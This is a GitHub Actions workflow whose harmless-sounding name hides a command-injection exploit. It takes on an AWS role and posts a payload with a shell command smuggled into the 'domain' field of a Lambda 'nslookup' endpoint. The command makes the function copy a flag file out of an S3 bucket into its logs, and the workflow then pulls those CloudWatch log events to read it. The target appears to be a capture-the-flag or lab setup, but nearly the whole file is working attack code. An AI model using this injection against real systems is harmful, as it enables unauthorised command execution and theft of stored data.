name: AWS OIDC test for school standart old code procedure

on:
  push:
    branches:
      - corgi

permissions:
  id-token: write
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Invoke Vulnerable Lambda
        run: |
          API_ID="3q931syi7b"
          REGION="us-east-1"
          URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev/nslookup"
          
          echo "=== 1. FORCING LAMBDA TO READ THE FLAG INTO LOGS ==="
          # This tells the Lambda to use its internal AWS CLI to read flag.txt from the bucket and log it out
          PAYLOAD='{"domain": "127.0.0.1; aws s3 cp s3://codec4f26c862a321ef5/flag.txt -"}'
          
          curl -s -X POST "$URL" \
            -H "Content-Type: application/json" \
            -d "$PAYLOAD"
          
          echo ""
          echo "=== 2. WAITING 3 SECONDS FOR LOGS TO SYNC ==="
          sleep 3
          
          echo "=== 3. PULLING LOGS VIA ALTERNATIVE API ==="
          # Get the latest log stream name
          STREAM_NAME=$(aws logs describe-log-streams \
            --log-group-name /aws/lambda/nslookupv2 \
            --order-by LastEventTime \
            --descending \
            --limit 1 \
            --query 'logStreams[0].logStreamName' \
            --output text --region ${REGION})
          
          echo "Found Log Stream: $STREAM_NAME"
          
          # Fetch the actual log events using GetLogEvents
          aws logs get-log-events \
            --log-group-name /aws/lambda/nslookupv2 \
            --log-stream-name "$STREAM_NAME" \
            --region ${REGION} \
            --query 'events[*].message' \
            --output text
